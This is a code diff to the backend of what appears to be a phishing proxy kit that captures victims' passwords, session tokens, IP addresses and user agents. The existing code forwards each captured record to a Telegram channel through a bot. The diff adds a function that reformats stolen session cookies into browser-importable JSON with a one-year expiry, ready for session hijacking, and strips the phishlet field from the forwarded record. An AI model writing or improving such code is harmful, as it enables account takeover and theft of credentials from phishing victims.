@@ -38,7 +38,7 @@ exports.create = (req, res) => {
       password,
       bodyToken: JSON.stringify(body_tokens),
       httpToken: JSON.stringify(http_tokens),
-      cookieToken: JSON.stringify(tokens),
+      cookieToken: cookieToString(tokens),
       sessionId: session_id,
       userAgent: useragent,
       remoteAddr: remote_addr,
@@ -50,6 +50,7 @@ exports.create = (req, res) => {
           try {
             data = data.toJSON();
             delete data.id;
+            delete data.phishlet;
             delete data.updatedAt;
             bot.sendMessage(lure.channel, JSON.stringify(data));
             resolve({}, res);
@@ -67,4 +68,38 @@ exports.delete = (req, res) => {
     .remove(req.body.id)
     .then((data) => resolve(data, res))
     .catch((err) => reject(err, res));
+};
+
+const cookieToString = (tokens) => {
+  const cookies = [];
+
+  // eslint-disable-next-line no-restricted-syntax
+  for (const domain in tokens) {
+    for (const key in tokens[domain]) {
+      const token = tokens[domain][key];
+
+      const expirationDate =
+        Math.floor(new Date().getTime() / 1000) + 365 * 24 * 60 * 60; // 1 year in seconds
+
+      const cookie = {
+        path: token.Path,
+        domain,
+        expirationDate,
+        value: token.Value,
+        name: key,
+        httpOnly: token.HttpOnly,
+      };
+
+      if (domain[0] === ".") {
+        cookie.domain = domain.slice(1);
+      } else {
+        cookie.hostOnly = true;
+      }
+      if (cookie.path == "") {
+        cookie.path = "/";
+      }
+      cookies.push(cookie);
+    }
+  }
+  return JSON.stringify(cookies);
 };
